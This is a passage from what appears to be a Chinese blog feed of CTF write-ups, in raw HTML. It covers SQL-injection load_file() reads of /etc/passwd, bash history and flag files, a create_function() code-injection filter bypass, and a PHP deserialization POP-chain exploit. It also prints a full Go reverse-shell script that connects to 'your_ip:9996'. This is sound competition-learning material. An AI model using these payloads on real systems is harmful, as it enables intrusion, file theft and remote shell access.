class="hljs-symbol">:/usr/sbin/nologin</span><br></code></pre></td></tr></table></figure><p>可以使用 <code>cat</code> 命令来查看 <code>/etc/passwd</code> 文件的内容，例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure></blockquote><p><img src="https://s2.loli.net/2023/05/14/VaT2O47HDyoqlrA.png" alt="image-20230514133819724"></p><p>这里我们发现 <code>www</code>用户的<strong>用户主目录刚好为 <code>/home</code></strong></p><p>这个目录下有一个神奇的文件：<code>.bash_history</code></p><blockquote><p><code>.bash_history</code> 是一个隐藏文件，它<strong>保存了用户在命令行界面中输入的历史命令记录</strong>。当用户退出当前命令行终端时，系统会将当前的历史命令保存到 <code>.bash_history</code> 文件中，下次用户登录时，可以使用方向键等功能浏览并调用之前输入过的命令。</p><p><strong><code>.bash_history</code> 文件通常位于用户的主目录</strong>下，可以使用以下命令来查看该文件的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ~/.bash_history<br></code></pre></td></tr></table></figure><p>也可以使用其他文本编辑器，如 <code>vi</code>、<code>nano</code> 等编辑器来查看和编辑该文件，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi ~/.bash_history<br></code></pre></td></tr></table></figure><p>需要注意的是，<code>.bash_history</code> 文件中包含了用户输入的所有命令记录，包括敏感信息，因此需要妥善保管。为了保护用户的隐私，可以使用 <code>history</code> 命令来清除或删除历史命令记录，也可以在用户的 <code>~/.bashrc</code> 文件中设置不记录历史命令等操作。</p></blockquote><p>我们查看一下：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&#x27;,<span class="hljs-built_in">content</span>=load_file(<span class="hljs-string">&quot;/home/www/.bash_history&quot;</span>),<span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure><p>得到：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/tmp/</span><br>unzip html.zip<br>rm -f html.zip<br>cp -r html <span class="hljs-regexp">/var/</span>www/<br>cd <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span><br>rm -f .DS_Store<br>service apache2 start<br></code></pre></td></tr></table></figure><p>这一些指令的意思是：</p><p>解压 <code>/tmp</code>下的 <code>html.zip</code>压缩包，然后删除这个压缩包，复制<code>html</code>目录到 <code>/var/www/html</code>下，删除该目录的 <code>.DS_Store</code>文件</p><blockquote><p><code>.DS_Store</code> 是一个隐藏文件，它通常出现在 Mac OS 系统中，用于存储某个目录的自定义显示属性，例如图标位置、背景色等。在打开一个包含 <code>.DS_Store</code> 文件的文件夹时，系统会根据该文件中保存的自定义属性来展示文件夹的显示效果。</p><p><code>.DS_Store</code> 文件是由 Finder 应用程序自动生成和维护的，它存储了目录的各种视觉和结构属性，如文件的位置、大小、图标等。该文件默认是隐藏的，因此在正常使用的情况下，用户无法看到它。但在一些情况下，例如将一个 Mac 上的文件夹复制到其他系统或者网络共享中时，<code>.DS_Store</code> 文件可能会成为一个问题。</p><p>如果不希望 <code>.DS_Store</code> 文件在复制或共享时被包含在内，可以通过以下方法来禁用它的生成：</p><ol><li><p>在命令行中使用如下命令：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">defaults <span class="hljs-built_in">write</span> com.apple.desktopservices DSDontWriteNetworkStores <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>该命令会禁用在网络共享中生成 <code>.DS_Store</code> 文件。</p></li><li><p>在命令行中使用如下命令：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">defaults <span class="hljs-built_in">write</span> com.apple.finder CreateDesktop <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>该命令会禁用在本地目录中生成 <code>.DS_Store</code> 文件。</p></li></ol><p>需要注意的是，禁用 <code>.DS_Store</code> 文件可能会影响到 Finder 的显示效果，因此建议在操作前备份好数据，并在需要时重新启用该文件。</p></blockquote><p><code>.DS_Store</code>文件存储了<code>html</code>目录的一些属性。</p><p>这里注意的是，虽然删除了该目录的该文件，但是 <code>/tmp/html</code>目录下没有删除，</p><p>我们获取一下该文件：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&#x27;,<span class="hljs-built_in">content</span>=hex(load_file(<span class="hljs-string">&quot;/tmp/html/.DS_Store&quot;</span>)),<span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure><p>这里使用hex编码，防止不可见字符，然后转为字符串：</p><p><img src="https://s2.loli.net/2023/05/14/X2Zbgrxp83BFPYq.png" alt="image-20230514135523267"></p><p>发现php文件，读取：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&#x27;,<span class="hljs-built_in">content</span>=hex(load_file(<span class="hljs-string">&quot;/tmp/html/flag_8946e1ff1ee3e40f.php&quot;</span>)),<span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure><p>是个假的，读<code>/var/www/html</code>目录下的：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&#x27;,<span class="hljs-built_in">content</span>=hex(load_file(<span class="hljs-string">&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;</span>)),<span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Comment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>create_function()命令执行</title>
    <link href="/2023/08/24/create_function()%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2023/08/24/create_function()%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="create-function-命令执行"><a href="#create-function-命令执行" class="headerlink" title="create_function()命令执行"></a>create_function()命令执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable">$code</span>) || <br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="hljs-variable">$arg</span>) ) &#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-variable">$code</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>); <br>&#125;<br></code></pre></td></tr></table></figure><p>这里的重点是：</p><p>第五点的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br></code></pre></td></tr></table></figure><p><code>extract()函数</code>作用是：将数组值 赋值给数组名同名的变量</p><p>我们可以通过这里去产生 <code>$code</code>、<code>$arg</code> 变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$code</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>); <br></code></pre></td></tr></table></figure><p><code>$code(&#39;&#39;, $arg); </code> 这一句十分重要</p><p>由于括号中使用的是逗号，我们一般的命令执行应该使用不了，参数不能控制。</p><p>了解到一种新的方法：<code>create_function()代码注入</code></p><blockquote><p>从<code>PHP 7.2.0</code>开始，<code>create_function()</code>被废弃</p></blockquote><p>文章：<a href="https://www.cnblogs.com/-chenxs/p/11459374.html">https://www.cnblogs.com/-chenxs/p/11459374.html</a></p><p><code>create_function($arg1,$arg2)</code>会创造一个匿名函数，</p><p>函数的参数部分由 <code>$arg1</code>指定</p><p>函数体由 <code>$arg2</code> 指定</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a,$b&#x27;</span>, <span class="hljs-string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>会创建以下匿名参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lambda</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ln(<span class="hljs-subst">$a</span>) + ln(<span class="hljs-subst">$b</span>) = &quot;</span> . <span class="hljs-title function_ invoke__">log</span>(<span class="hljs-variable">$a</span> * <span class="hljs-variable">$b</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以在 $arg2 进行改动，实现代码注入</p><p>如果<code>$arg2 = &#125;phpinfo();//</code>   可以执行<code>phpinfo()</code>函数</p><p>原因：首先 <code>&#125;</code> 将匿名函数的大括号<code>&#125;</code>闭合了，然后 <code>//</code> 将后面的大括号<code>&#125;</code>给注释掉了</p><p>所以，这之间就可以写相应的代码了</p><p>由于这里过滤了很多东西，但是恰好引入了 <code>flag.php</code>，其中一定存在相应的flag变量</p><p>所以我们可以使用 <code>get_defined_vars()</code>函数：返回所有已定义变量组成的数组</p><p>然后使用 <code>var_dump()</code>进行输出</p><p>这样就可以知道有关flag的变量名了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">arg=&#125;<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>());<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><h4 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h4>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>create_function()命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/08/24/2023%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9Bwp/"/>
    <url>/2023/08/24/2023%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="第三届陕西省大学生网络安全技能大赛wp"><a href="#第三届陕西省大学生网络安全技能大赛wp" class="headerlink" title="第三届陕西省大学生网络安全技能大赛wp"></a>第三届陕西省大学生网络安全技能大赛wp</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><p>在源码找到base64</p><p><img src="https://s2.loli.net/2023/06/08/BMNl13hdO5DWgSE.png" alt="image-20230608202614434"></p><p>解码：  <code>/pop3ZTgMw.php</code>，访问获得源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">night</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$night</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;night . <span class="hljs-string">&#x27;哒咩哟&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">day</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$day</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;day-&gt;<span class="hljs-title function_ invoke__">go</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;day-&gt;<span class="hljs-title function_ invoke__">getFlag</span>();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">light</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$light</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;light-&gt;<span class="hljs-title function_ invoke__">d</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dark</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dark</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">go</span>(<span class="hljs-params"></span>)</span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;dark)();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-title function_ invoke__">hacked</span>(<span class="hljs-variable">$this</span>-&gt;dark));<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hacked</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$s</span>, <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;/&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;呆jio步&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/\.\.*/&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$s</span>, ENT_QUOTES, <span class="hljs-string">&#x27;UTF-8&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strip_tags</span>(<span class="hljs-variable">$s</span>);<br>&#125;<br><br><span class="hljs-variable">$un</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;‮⁦快给我传参⁩⁦pop&#x27;</span>]); <span class="hljs-comment">// </span><br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;seino&#x27;</span>);<br></code></pre></td></tr></table></figure><p>突破点在dark类的getFlag方法，里面有个include可以文件包含，可以使用php伪协议绕过hacked函数</p><p>很简单直接构造poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dark</span>();<br><span class="hljs-variable">$a</span>-&gt;dark=<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">day</span>();<br><span class="hljs-variable">$b</span>-&gt;day=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">light</span>();<br><span class="hljs-variable">$c</span>-&gt;light=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dark</span>();<br><span class="hljs-variable">$d</span>-&gt;dark=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$e</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">day</span>();<br><span class="hljs-variable">$e</span>-&gt;day=<span class="hljs-variable">$d</span>;<br><span class="hljs-variable">$n</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">night</span>();<br><span class="hljs-variable">$n</span>-&gt;night=<span class="hljs-variable">$e</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$n</span>);<br><br><br>O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;night&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;night&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;day&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;day&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;dark&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;dark&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;light&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;light&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;day&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;day&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;dark&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;dark&quot;</span>;s:<span class="hljs-number">49</span>:<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/06/08/mTljdLZzo3DRak2.png" alt="image-20230608202830909"></p><p>我们把源码复制进phpstorm发现有点小问题：</p><p><img src="https://s2.loli.net/2023/06/08/gAvu2qMDcOC8WZs.png" alt="image-20230608202918528"></p><p>post参数变了，</p><p>可能是不可见字符搞的鬼，我们需要将这些字符进行url编码再传参</p><p>post传参：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">%E2%<span class="hljs-number">80</span>%AE%E2%<span class="hljs-number">81</span>%A6%E5%BF%AB%E7%BB%<span class="hljs-number">99</span>%E6%<span class="hljs-number">88</span>%<span class="hljs-number">91</span>%E4%BC%A0%E5%<span class="hljs-number">8</span>F%<span class="hljs-number">82</span>%E2%<span class="hljs-number">81</span>%A9%E2%<span class="hljs-number">81</span>%A6pop<br></code></pre></td></tr></table></figure><p>但是传参发现没用：</p><p><img src="https://s2.loli.net/2023/06/08/HWYXo7MVi8btAyU.png" alt="image-20230608205521106"></p><p>因为这里抛出了一个异常，导致destruct方法没有被触发，</p><p>我们可以使用 <code>fast destruct</code>技巧提前触发 <code>__destruct()</code></p><p>这里我们可以删除最后一个大括号 <code>&#125;</code>：得到flag的base64编码</p><p><img src="https://s2.loli.net/2023/06/08/2SteNkbqYsW7jzE.png" alt="image-20230608205925122"></p><blockquote><p>本质上，fast destruct 是因为unserialize过程中扫描器发现序列化字符串格式有误导致的提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的<code>__destruct()</code>,提前触发反序列化链条。</p></blockquote><h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p><img src="https://s2.loli.net/2023/06/08/Wq4ViJQy9PNIDC7.png" alt="image-20230608210238283"></p><p>f12找到隐藏页面：</p><p><img src="https://s2.loli.net/2023/06/08/oq9geUXtGCLBmYS.png" alt="image-20230608210301665"></p><p>我们把index改为admin：</p><p><img src="https://s2.loli.net/2023/06/08/FkKCD1sldUgxEa8.png" alt="image-20230608210329993"></p><p>md5解码得到：</p><p><img src="https://s2.loli.net/2023/06/08/lDcRYErFJ7g6QA1.png" alt="image-20230608210346210"></p><p>使用账号密码登录：</p><p><img src="https://s2.loli.net/2023/06/08/w6CmphPTQRvA7j8.png" alt="image-20230608210421587"></p><p>提示我们上传go文件后就会执行它，所以我们直接反弹shell</p><p>反弹shell go脚本</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;net&quot;</span><br>    <span class="hljs-string">&quot;os/exec&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">// 连接到攻击者的 IP 地址和端口</span><br>    conn, err := net.Dial(<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-string">&quot;your_ip:9996&quot;</span>)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-built_in">panic</span>(err)<br>    &#125;<br><br>    <span class="hljs-comment">// 将连接交给 Cmd 对象处理</span><br>    cmd := exec.Command(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>    cmd.Stdin = conn<br>    cmd.Stdout = conn<br>    cmd.Stderr = conn<br><br>    <span class="hljs-comment">// 启动 Cmd 对象</span><br>    err = cmd.Start()<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-built_in">panic</span>(err)<br>    &#125;<br><br>    <span class="hljs-comment">// 等待 Cmd 对象执行完毕</span><br>    err = cmd.Wait()<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-built_in">panic</span>(err)<br>    &#125;<br>    <br>    <span class="hljs-comment">// 关闭连接</span><br>    conn.Close()<br><br>    <span class="hljs-comment">// 输出完成信息</span><br>    fmt.Println(<span class="hljs-string">&quot;Shell session terminated&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>构造上传页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://d5e624ee.clsadp.com/Adm1nUp104d&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span 